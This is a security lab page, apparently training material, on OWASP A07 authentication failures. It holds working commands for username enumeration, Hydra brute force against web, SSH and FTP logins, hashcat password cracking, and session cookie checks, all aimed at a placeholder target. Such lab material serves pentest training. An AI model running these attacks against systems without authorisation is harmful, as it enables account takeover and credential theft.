---
title: A07 — Authentication Failures
sidebar_position: 7
tags: [lab, owasp-a07, brute-force, enumeration, session]
---

# A07 — Authentication Failures

## What this lab covers

- Username enumeration — detecting differences in response for valid vs. invalid usernames
- Brute force attacks — Hydra across HTTP, SSH, FTP
- Offline hash cracking — hashcat modes and attack strategies
- Session token analysis — checking cookie security flags and token entropy

## Configuration

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
WORDLIST="/usr/share/wordlists/rockyou.txt"
```

## Exercise 1: Username Enumeration

Compare response size and timing for existing vs. non-existing users:

```bash
USERNAMES=(admin administrator root user test guest support info contact nobody)

for USERNAME in "${USERNAMES[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}:%{time_total}" \
    -X POST "$TARGET/login" \
    -d "username=$USERNAME&password=invalidpassword12345")
  echo "$USERNAME: $RESPONSE"
done
```

A vulnerable application returns different HTTP status codes, response body sizes, or response times for valid vs. invalid usernames — allowing an attacker to confirm which usernames exist before brute-forcing passwords.

## Exercise 2: Brute Force with Hydra

### HTTP POST login form

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P "$WORDLIST" \
      -t 4 \
      "$TARGET" http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### HTTP Basic Authentication

```bash
hydra -l admin -P "$WORDLIST" "$TARGET" http-get /protected/
```

### SSH

```bash
hydra -l root -P "$WORDLIST" ssh://$TARGET
```

### FTP

```bash
hydra -l admin -P "$WORDLIST" ftp://$TARGET
```

### Check for rate limiting

```bash
for i in $(seq 1 20); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET/login" \
    -d "username=admin&password=wrongpassword$i")
  echo "Attempt $i: HTTP $RESPONSE"
  if [ "$RESPONSE" = "429" ]; then
    echo "[RATE LIMITED] Server returned 429 after $i attempts"
    break
  fi
done
```

HTTP 429 (Too Many Requests) indicates rate limiting is implemented. No 429 after 20 attempts is a finding.

## Exercise 3: Offline Hash Cracking

### Identify hash type

```bash
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
hashid "5f4dcc3b5aa765d61d8327deb882cf99"
```

### Hashcat modes

| Mode | Algorithm |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 1800 | sha512crypt (Linux shadow) |
| 500 | md5crypt (Apache, older Linux) |

### Dictionary attack

```bash
hashcat -m 0 hashes.txt "$WORDLIST"
```

### Rules-based attack (mangling)

```bash
hashcat -m 0 hashes.txt "$WORDLIST" -r /usr/share/hashcat/rules/best64.rule
```

### Mask attack — pattern-based

```bash
# 8-character passwords: uppercase + lowercase + digit + digit
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d
```

## Exercise 4: Session Token Analysis

### Extract Set-Cookie headers

```bash
curl -sI -X POST "$TARGET/login" \
  -d "username=admin&password=password" \
  | grep -i "set-cookie"
```

### Check security flags

For each cookie, verify:

| Flag | Purpose | Finding if missing |
|------|---------|-------------------|
| `HttpOnly` | Prevents JavaScript access | XSS can steal the cookie |
| `Secure` | Cookie only sent over HTTPS | Cookie sent over plain HTTP |
| `SameSite=Strict` or `Lax` | CSRF protection | Session fixation/CSRF risk |

### Token length check

```bash
SESSION_TOKEN=$(curl -sI -X POST "$TARGET/login" \
  -d "username=admin&password=password" \
  | grep -i "set-cookie" \
  | grep -oP "session=\K[^;]+")

TOKEN_LENGTH=${#SESSION_TOKEN}
echo "Token: $SESSION_TOKEN"
echo "Length: $TOKEN_LENGTH characters"

if [ "$TOKEN_LENGTH" -lt 16 ]; then
  echo "[WEAK] Token is shorter than 16 characters — may be predictable"
else
  echo "[OK] Token length is $TOKEN_LENGTH characters"
fi
```

A session token shorter than 16 characters (or one that follows a predictable pattern) is a finding. Tokens should be cryptographically random and at least 128 bits (16 bytes, 32 hex characters).
